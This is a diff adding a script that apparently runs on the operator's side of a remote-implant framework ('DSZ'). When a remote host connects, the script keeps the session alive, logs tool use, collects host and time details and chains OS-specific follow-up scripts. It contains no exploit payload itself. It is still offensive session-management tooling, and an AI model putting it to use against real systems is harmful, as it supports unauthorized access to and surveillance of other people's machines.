@@ -1,0 +1,159 @@
+
+@include "_Versions.dsi";
+@include "_CommandModification.dsi";
+@include "_Xml.dsi";
+
+@echo off;
+@quiet off;
+
+bool $rtn = true;
+
+string $arch, $os;
+int $major, $minor, $other;
+_GetArch($arch);
+_GetOsFamily($os);
+_GetOsVersion($major, $minor, $other);
+
+string $compiledArch, $compiledOs;
+_GetCompiledArch($compiledArch);
+_GetCompiledOsFamily($compiledOs);
+
+bool $useCompiledOs;
+string $use_os;
+if (!GetEnv("_USE_COMPILED_OS", $useCompiledOs) ||
+	!defined($useCompiledOs) ||
+	!$useCompiledOs)
+{
+	$use_os = $os;
+}
+else
+{
+	$use_os = $compiledOs;
+}
+
+echo "Remote host is $arch-$use_os ($major.$minor.$other)";
+
+# record tool usage
+RecordUseOfDsz();
+
+# start the keepalive command
+`keepalive -delay 1m`;
+
+# get the version
+`version`;
+
+# print the LP env so we have a record of what DSZ returned
+`local lpgetenv`;
+
+# disable / prompt any relevant commands
+_CheckForCommandModifications();
+
+if (_IsUnix()) {
+    # on unix, set the path
+    `environment -var PATH -set /bin:/usr/bin:/sbin:/usr/sbin`;
+}
+
+# run the OS-specific DSZ connected script
+string $resDir;
+_GetLpResourcesDirectory($resDir);
+bool $platSpecificFailed = !RunScriptIfAvailable( "$resDir/Dsz/Scripts/Connected/$use_os/_Connected.dss" );
+
+# get the current remote directory so that virtual directories work
+`pwd`;
+
+# look for connected scripts for other projects
+string $dataPath;
+_GetLpProjectsDirectories( $dataPath );
+int $i = sizeof( $dataPath );
+while( $i > 0 ) {
+	$i--;
+	# don't run Dsz, though
+	if( RegexMatch( "^.*Dsz\$", $dataPath[$i] ) ) {
+		continue;
+	}
+	$platSpecificFailed = ( !RunScriptIfAvailable("$dataPath[$i]/Scripts/Connected/_Connected.dss") || $platSpecificFailed );
+}
+
+if( $platSpecificFailed ) {
+	# failure of the OS-specific connected scripts
+	# ...We don't want to run 'time' (or anything else remotely) in case
+	#    the connected script failed because it's not safe to run modules for
+	#    some reason.
+	echo("* At least one _Connected.dss script FAILED", WARNING);
+	echo("*", WARNING);
+	echo("*   If it is safe to continue, do so as all REQUIRED scripts have not yet run", WARNING);
+	pause;
+}
+
+# get the time information
+`script _GetTimeInfo.dss -project Dsz`;
+
+# get the host information
+`script _GetHostInfo.dss -project Dsz`;
+
+# run the OS-specific DSZ pre-user connected script
+if (!RunScriptIfAvailable( "$resDir/Dsz/Scripts/Connected/$use_os/_PreUserConnected.dss"))
+{
+	$rtn = false;
+}
+
+# look for pre-user connected scripts for other projects
+$i = sizeof($dataPath);
+while ($i > 0)
+{
+	$i--;
+	# don't run Dsz, though
+	if (RegexMatch( "^.*Dsz\$", $dataPath[$i]))
+	{
+		continue;
+	}
+	if (!RunScriptIfAvailable("$dataPath[$i]/Scripts/Connected/_PreUserConnected.dss"))
+	{
+		$rtn = false;
+	}	
+}
+
+if( $compiledArch != $arch || $compiledOs != $os ) {
+	# change this to some form of notify?
+	echo("", warning);
+	echo("", warning);
+	echo("Binaries are compiled for $compiledArch-$compiledOs but the system is $arch-$os", warning);
+	echo("", warning);
+	echo("", warning);
+}
+
+echo "\n--------------------------------------------------\n";
+
+return $rtn;
+
+#---------------------------------------------------------------------------
+Sub RecordUseOfDsz()
+{
+
+	string $resDir;
+	_GetLpResourcesDirectory($resDir);
+
+	_XmlElement @element;
+	if (!_XmlReadFile("$resDir/Dsz/Version.xml", "Version", @element))
+	{
+		echo("Failed to open $resDir/Dsz/Version.xml for record of tool usage", WARNING);
+	}
+	else
+	{
+		string $name;
+		RegExSplit(" ", @element.$text, 2, $name);
+		_RecordToolUse($name[0], $name[1], "EXERCISED", "Successful");
+	}
+	
+	return true;
+}
+
+#---------------------------------------------------------------------------
+Sub RunScriptIfAvailable(IN string $script)
+{
+	if (!FileCheck($script))
+	{
+		return true;
+	}
+	return `script $script`;
+}
